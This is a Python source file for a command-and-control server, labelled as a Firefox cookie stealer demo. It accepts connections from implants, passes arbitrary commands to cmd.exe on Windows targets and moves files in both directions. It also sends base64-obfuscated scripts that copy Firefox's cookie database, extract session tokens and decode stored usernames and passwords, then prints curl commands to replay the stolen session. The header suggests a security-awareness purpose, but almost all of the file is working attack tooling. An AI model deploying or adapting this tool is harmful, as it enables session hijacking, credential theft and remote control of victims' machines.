#!/usr/bin/env python3
# ============================================================
# Firefox Browser Cookie Stealer C2 Demo
#
# https://github.com/0xsyr0/Security-Awareness-Calculator
# ============================================================

import socket, threading, uuid, json, datetime, base64, os, sys, readline

sessions      = {}
sessions_lock = threading.Lock()

readline.parse_and_bind('tab: complete')
readline.parse_and_bind('"\\e[A": history-search-backward')
readline.parse_and_bind('"\\e[B": history-search-forward')

# ── colors ─────────────────────────────────────────────────────────────────────

def c(msg, col='reset'):
    codes = {
        'reset':  '\033[0m',
        'green':  '\033[92m',
        'yellow': '\033[93m',
        'red':    '\033[91m',
        'cyan':   '\033[96m',
        'bold':   '\033[1m',
    }
    return f"{codes.get(col,'')}{msg}{codes['reset']}"

def cprint(msg, col='reset'):
    print(c(msg, col))

# ── banners ────────────────────────────────────────────────────────────────────

def print_banner():
    print(c("""
  ____  _                 _        ____ ____
 / ___|(_)_ __ ___  _ __ | | ___  / ___|___ \\
 \\___ \\| | '_ ` _ \\| '_ \\| |/ _ \\| |     __) |
  ___) | | | | | | | |_) | |  __/| |___ / __/
 |____/|_|_| |_| |_| .__/|_|\\___| \\____|_____|
                    |_|
""", 'cyan'))
    cprint(" Firefox Cookie Stealer C2 Demo", 'bold')
    cprint(" ─────────────────────────────────────────────────", 'cyan')
    print_main_help()

def print_main_help():
    cprint("\n Main menu commands:\n", 'yellow')
    print(f"   {'sessions':<24} list all active sessions")
    print(f"   {'use <id>':<24} interact with session by short ID")
    print(f"   {'clear_sessions':<24} remove dead sessions from table")
    print(f"   {'help':<24} show this help menu")
    print(f"   {'quit':<24} shut down C2 server")
    cprint(" ─────────────────────────────────────────────────\n", 'cyan')

def print_session_help():
    cprint("\n Session commands:\n", 'yellow')
    print(f"   {'steal_cookies':<24} steal and decode Firefox session_token")
    print(f"   {'dump_cookies [host]':<24} dump all Firefox cookies, optional host filter")
    print(f"   {'debug_cookies':<24} dump raw Firefox cookie metadata")
    print(f"   {'whoami':<24} current user context and privileges")
    print(f"   {'pwd':<24} print current working directory")
    print(f"   {'cd <path>':<24} change working directory")
    print(f"   {'dir [path]':<24} list directory (default: current)")
    print(f"   {'mkdir <path>':<24} create directory recursively")
    print(f"   {'type <file>':<24} print file contents to screen")
    print(f"   {'writefile <path> <data>':<24} write text to file on target")
    print(f"   {'download <path>':<24} download file from target to Kali")
    print(f"   {'upload <l> <r>':<24} upload local file to remote path")
    print(f"   {'background':<24} return to main menu (session alive)")
    print(f"   {'exit':<24} terminate and close session")
    print(f"   {'help':<24} show this help menu")
    print(f"   {'<any command>':<24} passed directly to cmd.exe on target")
    cprint(" ─────────────────────────────────────────────────\n", 'cyan')

# ── cookie script builder ──────────────────────────────────────────────────────

def _b64_encode_script(lines):
    script  = "\n".join(lines)
    encoded = base64.b64encode(script.encode('utf-8')).decode()
    return f"python -c \"import base64;exec(base64.b64decode('{encoded}').decode())\""

FIREFOX_LINES = [
    "import sqlite3,shutil,os,base64,json,glob",
    "profile_dir=os.path.expandvars(r'%APPDATA%\\Mozilla\\Firefox\\Profiles')",
    "profiles=glob.glob(os.path.join(profile_dir,'*.default-release'))",
    "if not profiles: profiles=glob.glob(os.path.join(profile_dir,'*'))",
    "if not profiles: print('NO_PROFILE__done__');exit()",
    "cf=os.path.join(profiles[0],'cookies.sqlite')",
    "ct=os.path.join(os.path.expandvars('%TEMP%'),'ff_ck.db')",
    "shutil.copy2(cf,ct)",
    "conn=sqlite3.connect(ct)",
    "cur=conn.cursor()",
]

def build_steal_cookies_cmd():
    script = FIREFOX_LINES + [
        "cur.execute(\"SELECT host,name,value FROM moz_cookies WHERE name='session_token'\")",
        "rows=cur.fetchall()",
        "conn.close()",
        "try: os.remove(ct)",
        "except: pass",
        "out=''",
        "for r in rows:",
        "    out+=r[0]+'|'+r[1]+'|'+r[2]+'\\n'",
        "print((out.strip() if out.strip() else 'NO_RESULTS')+'__done__')",
    ]
    return _b64_encode_script(script)

def build_dump_cookies_cmd(host_filter=None):
    where = f"WHERE host LIKE '%{host_filter}%'" if host_filter else ""
    script = FIREFOX_LINES + [
        f"cur.execute(\"SELECT host,name,value,isSecure,isHttpOnly FROM moz_cookies {where} ORDER BY host\")",
        "rows=cur.fetchall()",
        "conn.close()",
        "try: os.remove(ct)",
        "except: pass",
        "out=''",
        "for r in rows:",
        "    out+=r[0]+'|'+r[1]+'|'+r[2]+'|'+str(r[3])+'|'+str(r[4])+'\\n'",
        "print((out.strip() if out.strip() else 'NO_RESULTS')+'__done__')",
    ]
    return _b64_encode_script(script)

def build_debug_cookies_cmd():
    script = FIREFOX_LINES + [
        "cur.execute('SELECT COUNT(*) FROM moz_cookies')",
        "total=cur.fetchone()[0]",
        "cur.execute('SELECT DISTINCT host FROM moz_cookies ORDER BY host')",
        "hosts=cur.fetchall()",
        "cur.execute('SELECT host,name,length(value) FROM moz_cookies ORDER BY host')",
        "rows=cur.fetchall()",
        "conn.close()",
        "try: os.remove(ct)",
        "except: pass",
        "out=f'PROFILE:{profiles[0]}\\n'",
        "out+=f'TOTAL:{total}\\nHOSTS:\\n'",
        "out+='\\n'.join(f'  {h[0]}' for h in hosts)",
        "out+='\\nROWS:\\n'",
        "out+='\\n'.join(f'  {r[0]}|{r[1]}|val_len={r[2]}' for r in rows)",
        "print(out+'__done__')",
    ]
    return _b64_encode_script(script)

def decode_token(token):
    try:
        return json.loads(base64.b64decode(token).decode())
    except Exception:
        return None

def recv_response(conn):
    response = b''
    while True:
        chunk = conn.recv(65536)
        if not chunk:
            break
        response += chunk
        if response.endswith(b'__done__'):
            response = response[:-8]
            break
    return response.decode(errors='replace').rstrip()

def send_data(conn, cmd):
    data = cmd if isinstance(cmd, bytes) else cmd.encode()
    conn.send(len(data).to_bytes(4, 'big') + data)

def send_cmd(conn, cmd):
    send_data(conn, cmd)
    return recv_response(conn)

def resolve_sid(short_id):
    with sessions_lock:
        for sid in sessions:
            if sid.startswith(short_id) or sid[:8] == short_id:
                return sid
    return None

def is_alive(conn):
    try:
        conn.setblocking(False)
        conn.recv(1, socket.MSG_PEEK)
        conn.setblocking(True)
        return True
    except BlockingIOError:
        conn.setblocking(True)
        return True
    except Exception:
        return False

# ── session commands ───────────────────────────────────────────────────────────

def cmd_steal_cookies(conn, info):
    cprint("\n[*] Fetching Firefox session_token cookie...", 'cyan')
    conn.settimeout(60)
    send_data(conn, build_steal_cookies_cmd())
    raw = recv_response(conn).strip()
    conn.settimeout(30)
    if not raw or raw in ('NO_RESULTS', 'NO_PROFILE'):
        cprint("[-] No session_token found or Firefox not yet visited\n", 'yellow')
        return
    cprint(f"\n[+] Raw cookie entry:", 'green')
    print(f"    {raw}\n")
    parts = [p.strip() for p in raw.split('|')]
    if len(parts) >= 3:
        token   = parts[2]
        decoded = decode_token(token)
        if decoded:
            cprint("[+] Decoded session_token:", 'green')
            print(c(f"    User     : {decoded.get('user')}", 'bold'))
            print(c(f"    Password : {decoded.get('pass')}", 'bold'))
            cprint(f"\n[+] Replay command:", 'cyan')
            print(f"    curl -s http://{info.get('ip')}:5000/dashboard "
                  f"-H \"Cookie: session_token={token}\"\n")
        else:
            cprint(f"[-] Raw token (not JSON): {token}\n", 'yellow')

def cmd_dump_cookies(conn, info, args):
    host_filter = args[0] if args else None
    if host_filter:
        cprint(f"\n[*] Dumping Firefox cookies for host: {host_filter}...", 'cyan')
    else:
        cprint(f"\n[*] Dumping all Firefox cookies...", 'cyan')
    conn.settimeout(60)
    send_data(conn, build_dump_cookies_cmd(host_filter))
    raw = recv_response(conn).strip()
    conn.settimeout(30)
    if not raw or raw in ('NO_RESULTS', 'NO_PROFILE'):
        cprint("[-] No cookies found\n", 'yellow')
        return
    rows = [r for r in raw.splitlines() if r.strip()]
    cprint(f"\n[+] {len(rows)} cookie(s) found:\n", 'green')
    cprint(f"  {'Host':<30} {'Name':<24} {'Value':<40} {'Secure':<8} {'HttpOnly'}", 'bold')
    cprint(f"  {'-'*108}", 'cyan')
    session_tokens = []
    for row in rows:
        parts = row.split('|')
        if len(parts) < 5:
            continue
        host     = parts[0][:29]
        name     = parts[1][:23]
        value    = parts[2][:39]
        secure   = 'yes' if parts[3] == '1' else 'no'
        httponly = 'yes' if parts[4] == '1' else 'no'
        if parts[1] == 'session_token':
            print(c(f"  {host:<30} {name:<24} {value:<40} {secure:<8} {httponly}", 'yellow'))
            session_tokens.append(parts[2])
        else:
            print(f"  {host:<30} {name:<24} {value:<40} {secure:<8} {httponly}")
    if session_tokens:
        cprint(f"\n[+] session_token value(s) detected — attempting decode:\n", 'green')
        for token in session_tokens:
            decoded = decode_token(token)
            if decoded:
                print(c(f"    User     : {decoded.get('user')}", 'bold'))
                print(c(f"    Password : {decoded.get('pass')}", 'bold'))
                cprint(f"\n[+] Replay command:", 'cyan')
                print(f"    curl -s http://{info.get('ip')}:5000/dashboard "
                      f"-H \"Cookie: session_token={token}\"")
    print()

def cmd_download(conn, args):
    if not args:
        cprint("  usage: download <remote_path>\n", 'yellow')
        return
    remote   = args[0]
    filename = os.path.basename(remote)
    send_data(conn, f'__download__{remote}')
    data = b''
    while True:
        chunk = conn.recv(65536)
        if chunk == b'__notfound__':
            cprint(f"  [-] File not found: {remote}\n", 'red')
            return
        if chunk.endswith(b'__done__'):
            data += chunk[:-8]
            break
        data += chunk
    with open(filename, 'wb') as f:
        f.write(base64.b64decode(data))
    cprint(f"  [+] Downloaded {filename} ({len(data)} bytes)\n", 'green')

def cmd_upload(conn, args):
    if len(args) < 2:
        cprint("  usage: upload <local_file> <remote_destination>\n", 'yellow')
        return
    local, remote = args[0], args[1]
    if not os.path.isfile(local):
        cprint(f"  [-] Local file not found: {local}\n", 'red')
        return
    with open(local, 'rb') as f:
        data = base64.b64encode(f.read()).decode()
    send_data(conn, f'__upload__{remote}__{data}')
    cprint(f"  [+] {recv_response(conn).strip()}\n", 'green')

def cmd_writefile(conn, args):
    if len(args) < 2:
        cprint("  usage: writefile <remote_path> <content>\n", 'yellow')
        return
    remote  = args[0]
    content = ' '.join(args[1:])
    send_data(conn, f'__writefile__{remote}__{content}')
    cprint(f"  [+] {recv_response(conn).strip()}\n", 'green')

def cmd_clear_sessions():
    dead = []
    with sessions_lock:
        for sid, s in sessions.items():
            if not is_alive(s['conn']):
                dead.append(sid)
        for sid in dead:
            try:
                sessions[sid]['conn'].close()
            except Exception:
                pass
            del sessions[sid]
    if dead:
        cprint(f"\n[+] Cleared {len(dead)} dead session(s):\n", 'green')
        for sid in dead:
            cprint(f"    {sid[:8]}", 'red')
        print()
    else:
        cprint("\n[*] No dead sessions found\n", 'yellow')

# ── session interaction loop ───────────────────────────────────────────────────

def interact(sid):
    with sessions_lock:
        session = sessions.get(sid)
    if not session:
        cprint(f"[-] Session {sid[:8]} not found\n", 'red')
        return

    conn = session['conn']
    info = session['info']
    conn.settimeout(30)

    cprint(f"\n[*] Interacting with {sid[:8]} — "
           f"{info.get('username')} @ {info.get('hostname')} "
           f"({info.get('ip')}) — type 'background' to return\n", 'cyan')

    while True:
        try:
            raw = input(c(f"[{sid[:8]}]> ", 'green')).strip()
        except KeyboardInterrupt:
            print()
            cprint("[!] Use 'background' to return or 'exit' to kill session", 'yellow')
            continue
        except EOFError:
            break

        if not raw:
            continue

        parts = raw.split()
        cmd   = parts[0].lower()
        args  = parts[1:]

        try:
            if cmd == 'help':
                print_session_help()
            elif cmd == 'background':
                cprint("[*] Session backgrounded\n", 'yellow')
                break
            elif cmd == 'exit':
                send_data(conn, '__exit__')
                with sessions_lock:
                    sessions.pop(sid, None)
                cprint(f"[-] Session {sid[:8]} terminated\n", 'red')
                break
            elif cmd == 'steal_cookies':
                cmd_steal_cookies(conn, info)
            elif cmd == 'dump_cookies':
                cmd_dump_cookies(conn, info, args)
            elif cmd == 'debug_cookies':
                cprint("\n[*] Running cookie debug...", 'cyan')
                conn.settimeout(60)
                send_data(conn, build_debug_cookies_cmd())
                print(f"\n{recv_response(conn)}\n")
                conn.settimeout(30)
            elif cmd == 'whoami':
                print(f"\n{send_cmd(conn, 'whoami /all')}\n")
            elif cmd == 'pwd':
                print(f"\n{send_cmd(conn, '__pwd__')}\n")
            elif cmd == 'cd':
                if not args:
                    cprint("  usage: cd <path>\n", 'yellow')
                else:
                    print(f"\n{send_cmd(conn, '__cd__' + ' '.join(args))}\n")
            elif cmd == 'dir':
                path = args[0] if args else '.'
                print(f"\n{send_cmd(conn, f'dir \"{path}\"')}\n")
            elif cmd == 'mkdir':
                if not args:
                    cprint("  usage: mkdir <path>\n", 'yellow')
                else:
                    print(f"\n{send_cmd(conn, '__mkdir__' + ' '.join(args))}\n")
            elif cmd == 'type':
                if not args:
                    cprint("  usage: type <file>\n", 'yellow')
                else:
                    print(f"\n{send_cmd(conn, f'type \"{args[0]}\"')}\n")
            elif cmd == 'writefile':
                cmd_writefile(conn, args)
            elif cmd == 'download':
                cmd_download(conn, args)
            elif cmd == 'upload':
                cmd_upload(conn, args)
            else:
                print(f"\n{send_cmd(conn, raw)}\n")
        except socket.timeout:
            cprint(f"\n[-] Command timed out\n", 'yellow')
        except Exception as e:
            cprint(f"\n[-] Session lost: {e}\n", 'red')
            with sessions_lock:
                sessions.pop(sid, None)
            break

# ── incoming session handler ───────────────────────────────────────────────────

def handle_incoming(conn, addr):
    session_id = str(uuid.uuid4())
    conn.settimeout(30)
    try:
        info = json.loads(conn.recv(4096).decode())
    except Exception:
        conn.close()
        return

    with sessions_lock:
        sessions[session_id] = {
            'conn': conn,
            'addr': addr,
            'info': info,
            'time': datetime.datetime.now().isoformat()
        }

    print(f"\n{c('[+] New session: ' + session_id, 'green')}")
    print(c(f"    Host    : {info.get('hostname')}", 'cyan'))
    print(c(f"    User    : {info.get('username')}", 'cyan'))
    print(c(f"    OS      : {info.get('os')}", 'cyan'))
    print(c(f"    IP      : {info.get('ip')}", 'cyan'))
    print(c(f"    VS Code : {info.get('vscode')}", 'cyan'))
    print(f"\n{c('    use ' + session_id[:8] + ' to interact', 'yellow')}\n")
    print(c("[main]> ", 'green'), end='', flush=True)

# ── accept loop ────────────────────────────────────────────────────────────────

def accept_loop(srv):
    while True:
        try:
            conn, addr = srv.accept()
            t = threading.Thread(
                target=handle_incoming,
                args=(conn, addr),
                daemon=True
            )
            t.start()
        except Exception:
            break

# ── main menu ──────────────────────────────────────────────────────────────────

def main_menu():
    while True:
        try:
            raw = input(c("[main]> ", 'green')).strip()
        except KeyboardInterrupt:
            print()
            cprint("[!] Use 'quit' to exit", 'yellow')
            continue
        except EOFError:
            break

        if not raw:
            continue

        parts = raw.split()
        cmd   = parts[0].lower()
        args  = parts[1:]

        if cmd == 'help':
            print_main_help()
        elif cmd == 'sessions':
            with sessions_lock:
                if not sessions:
                    cprint("  no active sessions\n", 'yellow')
                    continue
                cprint(f"\n  {'ID':<10} {'User':<20} {'Host':<16} {'IP':<18} {'Connected':<28} {'Status'}", 'bold')
                cprint(f"  {'-'*95}", 'cyan')
                for sid, s in sessions.items():
                    i      = s['info']
                    alive  = is_alive(s['conn'])
                    status = c('alive', 'green') if alive else c('dead', 'red')
                    print(f"  {sid[:8]:<10} {i.get('username','?'):<20} "
                          f"{i.get('hostname','?'):<16} {i.get('ip','?'):<18} "
                          f"{s['time']:<28} [{status}]")
                print()
        elif cmd == 'clear_sessions':
            cmd_clear_sessions()
        elif cmd == 'use':
            if not args:
                cprint("  usage: use <short_id>\n", 'yellow')
                continue
            sid = resolve_sid(args[0])
            if not sid:
                cprint(f"  [-] Session {args[0]} not found\n", 'red')
                continue
            interact(sid)
        elif cmd == 'quit':
            cprint("\n[!] Shutting down C2...\n", 'yellow')
            os._exit(0)
        else:
            cprint(f"  [-] Unknown command: {cmd} — type 'help'\n", 'red')

# ── entry point ────────────────────────────────────────────────────────────────

def main():
    print_banner()
    host, port = '0.0.0.0', 9001
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(5)
    cprint(f"[*] Listening on {host}:{port}\n", 'green')
    t = threading.Thread(target=accept_loop, args=(srv,), daemon=True)
    t.start()
    main_menu()

if __name__ == '__main__':
    main()